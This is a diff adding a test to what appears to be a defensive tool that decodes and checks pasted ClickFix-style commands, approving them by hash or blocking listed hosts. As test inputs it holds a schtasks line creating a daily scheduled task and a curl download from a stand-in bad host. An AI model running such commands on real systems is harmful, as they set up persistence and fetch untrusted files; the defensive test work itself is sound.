@@ -60,3 +60,12 @@ test('check --trace prints every decoding step', () => {
   assert.match(out, /2\. decoded Base64 \(from step 1\) · removed \^ escape marks/);
   assert.match(out, /cmd \/c echo SIMULATED-CLICKFIX/);
 });
+
+test('hash prints the fingerprint that approves a command in check', () => {
+  const cmd = 'schtasks /create /tn Backup /tr C:\\b.bat /sc daily';
+  const h = run(['hash', cmd]).stdout.trim();
+  assert.match(h, /^[0-9a-f]{64}$/);
+  assert.equal(run(['check', cmd]).status, 1);
+  assert.equal(run(['check', cmd, '--approved', h]).status, 0);
+  assert.equal(run(['check', 'curl -o t.zip https://x.bad.test/t.zip', '--blocked-host', 'bad.test']).status, 2);
+});
